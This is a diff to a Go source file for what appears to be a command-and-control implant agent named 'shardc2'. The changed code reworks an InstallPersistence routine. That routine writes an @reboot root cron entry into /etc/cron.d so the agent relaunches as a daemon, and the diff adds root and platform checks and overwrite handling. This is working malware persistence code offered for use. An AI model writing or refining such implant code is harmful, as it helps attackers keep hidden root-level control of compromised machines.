@@ -5,7 +5,6 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
-	"io/ioutil"
 	"log"
 	"math/rand"
 	"net/http"
@@ -116,9 +115,47 @@ func (a *Agent) ProfileSystem() (*SystemProfile, error) {
 	}, nil
 }
 
-func (a *Agent) InstallPersistence() error {
-	// Add to cron for persistence
-	cronPath := "/etc/cron.d/shardc2"
-	cronEntry := fmt.Sprintf("@reboot root %s --daemon\n", os.Args[0])
-	return ioutil.WriteFile(cronPath, []byte(cronEntry), 0644)
+func (a *Agent) InstallPersistence(cronDir string) error {
+	isProduction := cronDir == "" || cronDir == "/etc/cron.d"
+	if cronDir == "" {
+		cronDir = "/etc/cron.d"
+	}
+
+	if isProduction {
+		// Check platform
+		if runtime.GOOS != "linux" {
+			return fmt.Errorf("persistence only supported on Linux")
+		}
+
+		// Check root privileges
+		if os.Getuid() != 0 {
+			return fmt.Errorf("persistence requires root privileges")
+		}
+	}
+
+	// Get absolute executable path
+	execPath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %w", err)
+	}
+
+	// Create cron entry
+	cronPath := cronDir + "/shardc2"
+	cronEntry := fmt.Sprintf("@reboot root %s --daemon\n", execPath)
+
+	// Check if file exists
+	if _, err := os.Stat(cronPath); err == nil {
+		log.Printf("Warning: cron file %s already exists, overwriting", cronPath)
+	} else if !os.IsNotExist(err) {
+		return fmt.Errorf("failed to check cron file: %w", err)
+	}
+
+	// Write the cron file
+	err = os.WriteFile(cronPath, []byte(cronEntry), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write cron file: %w", err)
+	}
+
+	log.Printf("Persistence installed successfully: %s", cronPath)
+	return nil
 }
